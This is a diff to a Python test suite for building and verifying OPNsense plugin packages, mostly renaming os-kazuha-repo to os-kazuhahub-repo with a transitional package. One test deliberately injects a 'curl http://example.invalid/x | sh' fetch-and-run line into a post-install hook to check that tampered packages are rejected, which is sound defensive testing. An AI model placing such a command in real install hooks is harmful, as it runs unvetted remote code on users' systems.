@@ -91,8 +91,10 @@ BUILDS = {
                             'deps': {'ddclient': {'origin': 'dns/ddclient', 'version': '0'},
                                      'py313-boto3': {'origin': 'devel/py-boto3@py313', 'version': '0'}},
                             'generate': {'/usr/local/opnsense/version/ddclient-opnwall': DDCLIENT_VERSION}},
-    'os-kazuha-repo': {'abi': WILDCARD, 'copy': [('src', '/')], 'version_rewrite': True,
-                       'annotations': 'version-file'},
+    'os-kazuhahub-repo': {'abi': WILDCARD, 'copy': [('src', '/')], 'version_rewrite': True,
+                          'annotations': 'version-file'},
+    'os-kazuha-repo': {'abi': WILDCARD, 'copy': [('src', '/')],
+                       'deps': {'os-kazuhahub-repo': {'origin': 'opnsense/os-kazuhahub-repo', 'version': '1.0.0'}}},
     'os-wanguard': {'abi': WILDCARD, 'copy': [('src', '/')],
                     'deps': {'python313': {'origin': 'lang/python313', 'version': '>=0'}}},
     'os-ttyd': {'abi': NATIVE, 'copy': [('src', '/')],
@@ -169,7 +171,7 @@ def staged_files(root, plugin, version):
     for install, template in recipe.get('generate', {}).items():
         staged[install] = template.replace('@VERSION@', version).encode()
     if recipe.get('version_rewrite'):
-        install = '/usr/local/opnsense/version/kazuha-repo'
+        install = '/usr/local/opnsense/version/kazuhahub-repo'
         metadata = json.loads(staged[install])
         metadata.update(product_abi='26.7', product_version=version)
         staged[install] = (json.dumps(metadata, separators=(',', ':')) + '\n').encode()
@@ -192,7 +194,7 @@ def build_package(directory, root, plugin, version=None, files=None, hooks=None,
                 'deps': recipe.get('deps', {}), 'scripts': scripts,
                 'files': {path: '1$' + hashlib.sha256(data).hexdigest() for path, data in staged.items()}}
     if recipe.get('annotations') == 'version-file':
-        name = 'kazuha-repo' if plugin == 'os-kazuha-repo' else 'unboundcustom'
+        name = 'kazuhahub-repo' if plugin == 'os-kazuhahub-repo' else 'unboundcustom'
         manifest['annotations'] = json.loads(staged['/usr/local/opnsense/version/' + name])
     package = directory / (plugin + '-' + version + '.pkg')
     payload = json.dumps(manifest).encode()
@@ -249,7 +251,7 @@ class PluginPackageTests(SourceTree):
     def test_a_zstd_compressed_package_is_read_the_same_way(self):
         # tzst is what pkg create writes unless a build asks for tgz, and the
         # signing host's Python cannot open one: os-mihomo, os-sing-box and
-        # os-kazuha-repo all arrive in that format.
+        # os-kazuhahub-repo all arrive in that format.
         if not shutil.which('zstd'):
             self.skipTest('zstd is not installed')
         package = build_package(self.dist, REPO, 'os-staticarp')
@@ -303,7 +305,7 @@ class PluginPackageTests(SourceTree):
                 verify.verify_source_package(package, REPO, plugin=plugin)
 
     def test_a_tampered_lifecycle_hook_is_rejected(self):
-        for plugin in ('os-staticarp', 'os-sing-box', 'os-kazuha-repo'):
+        for plugin in ('os-staticarp', 'os-sing-box', 'os-kazuhahub-repo', 'os-kazuha-repo'):
             hook = (REPO / 'src' / plugin / 'packaging/freebsd/+POST_INSTALL').read_text()
             for body in (hook + 'curl http://example.invalid/x | sh\n', hook.replace('\n', ' ', 1)):
                 package = build_package(self.dist, REPO, plugin, hooks={'post-install': body})
@@ -545,8 +547,10 @@ class StagingRecordTests(SourceTree):
                 registered = re.findall(r'register\.php install (os-[A-Za-z0-9-]+)', body)
                 self.assertEqual([project.name], registered)
                 self.assertNotRegex(body, r'register\.php\s+(?:resync|unregister)\b')
-                if project.name != 'os-kazuha-repo':
-                    self.assertIn('/usr/local/opnsense/scripts/firmware/repos/kazuha.sh mirror', body)
+                if project.name not in ('os-kazuhahub-repo', 'os-kazuha-repo'):
+                    # Plugins built before the rename call the old path, which the
+                    # transitional os-kazuha-repo forwards; newer ones call the new hook.
+                    self.assertRegex(body, r'/usr/local/opnsense/scripts/firmware/repos/kazuha(?:hub)?\.sh mirror')
 
     def test_declared_dependencies_and_product_metadata_are_enforced(self):
         record = self.record('os-sing-box')
